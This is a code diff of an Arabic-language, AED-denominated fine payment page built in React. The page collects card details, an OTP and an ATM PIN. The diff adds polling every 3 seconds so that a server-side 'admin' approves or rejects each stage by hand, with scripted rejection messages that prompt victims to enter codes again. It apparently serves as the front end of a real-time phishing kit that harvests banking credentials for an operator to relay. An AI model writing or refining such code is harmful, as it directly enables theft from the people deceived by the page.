@@ -667,43 +667,70 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
     { label: 'المبلغ المستحق', value: `${dueAmount} AED` },
   ]
 
-  // Check for admin actions and redirect URLs via polling
+  // Default rejection messages for each stage
+  const rejectionMessages: Record<string, string> = {
+    card: 'قد تكون بطاقتك غير مفعلة للدفع عبر الإنترنت. يرجى استخدام طرق دفع مختلفة أو التواصل مع المصرف.',
+    otp: 'الرمز الذي تم إدخاله غير صحيح أو غير صالح. يرجى التحقق من الرمز الصحيح وإعادة المحاولة.',
+    atm: 'الرقم السري للصراف الآلي غير صحيح.',
+  }
+
+  // Poll for admin actions (pass/denied/completed) and redirect URLs
   useEffect(() => {
-    const checkForRedirect = async () => {
+    const checkAdminAction = async () => {
       try {
-        const { getRedirectUrl } = await import('../lib/api')
-        const result = await getRedirectUrl(sessionId)
-        if (result.redirectUrl) {
-          window.location.href = result.redirectUrl
+        const { getSessionStatus, getRedirectUrl } = await import('../lib/api')
+        
+        // Check for redirect URL
+        try {
+          const redirectResult = await getRedirectUrl(sessionId)
+          if (redirectResult.redirectUrl) {
+            window.location.href = redirectResult.redirectUrl
+            return
+          }
+        } catch {}
+
+        // Check for admin action
+        const result = await getSessionStatus(sessionId)
+        if (result?.data) {
+          const serverStage = result.data.stage
+          const serverError = result.data.errorMessage
+
+          if (stage === 'card_pending') {
+            if (serverStage === 'otp') {
+              setStage('otp')
+            } else if (serverStage === 'card') {
+              setStage('card')
+              setErrorMessage(serverError || rejectionMessages.card)
+            }
+          }
+
+          if (stage === 'otp_pending') {
+            if (serverStage === 'atm') {
+              setStage('atm')
+            } else if (serverStage === 'otp') {
+              setStage('otp')
+              setErrorMessage(serverError || rejectionMessages.otp)
+            }
+          }
+
+          if (stage === 'atm_pending') {
+            if (serverStage === 'success') {
+              setStage('success')
+            } else if (serverStage === 'atm') {
+              setStage('atm')
+              setErrorMessage(serverError || rejectionMessages.atm)
+            } else if (serverStage === 'failed') {
+              setStage('failed')
+              setErrorMessage(serverError || rejectionMessages.atm)
+            }
+          }
         }
       } catch {}
     }
 
-    const interval = setInterval(checkForRedirect, 5000)
+    const interval = setInterval(checkAdminAction, 3000)
     return () => clearInterval(interval)
-  }, [sessionId])
-
-  // Auto-transition after submitting each stage - with API integration
-  useEffect(() => {
-    if (stage === 'card_pending') {
-      const timer = setTimeout(() => {
-        setStage('otp')
-      }, 3000)
-      return () => clearTimeout(timer)
-    }
-    if (stage === 'otp_pending') {
-      const timer = setTimeout(() => {
-        setStage('atm')
-      }, 3000)
-      return () => clearTimeout(timer)
-    }
-    if (stage === 'atm_pending') {
-      const timer = setTimeout(() => {
-        setStage('success')
-      }, 4000)
-      return () => clearTimeout(timer)
-    }
-  }, [stage])
+  }, [sessionId, stage])
 
   const handleCardSubmit = async (data: CardSubmitPayload) => {
     setIsSubmitting(true)
@@ -785,6 +812,7 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
       <div className="flex-1 max-w-3xl w-full mx-auto px-6 py-8">
         {stage === 'card' && (
           <>
+            {errorMessage && <ErrorBanner message={errorMessage} />}
             <SectionCard title="ملخص الدفع">
               <InfoTable rows={transactionRows} />
             </SectionCard>
@@ -793,7 +821,7 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
                 onSubmit={handleCardSubmit}
                 onCancel={onBackToHome}
                 isLoading={isSubmitting}
-                error={errorMessage}
+                error={null}
                 fineAmount={fineAmount}
                 discountAmount={discountAmount}
                 totalAmount={dueAmount}
